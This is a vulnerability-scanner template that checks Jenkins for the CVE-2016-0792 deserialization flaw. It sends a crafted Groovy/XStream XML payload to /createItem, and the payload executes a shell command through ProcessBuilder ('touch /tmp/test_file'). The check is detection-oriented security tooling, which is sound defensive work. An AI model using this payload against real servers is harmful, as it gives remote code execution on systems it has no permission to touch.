name: poc-yaml-jenkins-cve-2016-0792-deserialization
binding: 3603a630-29c9-439d-9a06-ea54348ddd77
manual: true
detail:
    links:
        - https://www.exploit-db.com/exploits/42394
    vulnerability:
        id: CT-48185
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /createItem?name=rand_dir
            headers:
                Content-Type: text/xml
            body: |
                <map>
                  <entry>
                    <groovy.util.Expando>
                      <expandoProperties>
                        <entry>
                          <string>hashCode</string>
                          <org.codehaus.groovy.runtime.MethodClosure>
                            <delegate class="groovy.util.Expando" reference="../../../.."/>
                            <owner class="java.lang.ProcessBuilder">
                              <command>
                                <string>touch</string>
                                <string>/tmp/test_file</string>
                              </command>
                              <redirectErrorStream>false</redirectErrorStream>
                            </owner>
                            <resolveStrategy>0</resolveStrategy>
                            <directive>0</directive>
                            <parameterTypes/>
                            <maximumNumberOfParameters>0</maximumNumberOfParameters>
                            <method>start</method>
                          </org.codehaus.groovy.runtime.MethodClosure>
                        </entry>
                      </expandoProperties>
                    </groovy.util.Expando>
                   <int>1</int>
                 </entry>
                </map>
        expression: response.status == 500 && (response.body.bcontains(b"jobs/rand_dir/config.xml") || response.body.bcontains(b"jobs\\rand_dir\\config.xml"))
expression: r0()
